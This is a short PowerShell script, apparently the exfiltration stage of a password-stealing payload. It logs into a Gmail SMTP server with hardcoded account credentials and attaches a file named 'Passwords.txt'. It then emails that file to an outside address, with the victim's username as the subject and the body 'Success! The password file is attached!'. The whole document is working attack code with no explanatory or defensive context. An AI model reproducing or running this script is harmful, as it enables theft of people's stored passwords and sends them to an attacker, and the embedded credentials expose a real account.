$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xiera.payload@gmail.com', 'D2HLhpitJurdqxolt1EctSBslybq3o')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'xiera.payload@gmail.com'
$E.To.Add('handyzwei58@gmail.com')
$E.Subject = $env:UserName
$E.Body = 'Success! The password file is attached!'
$F = "Passwords.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
exit
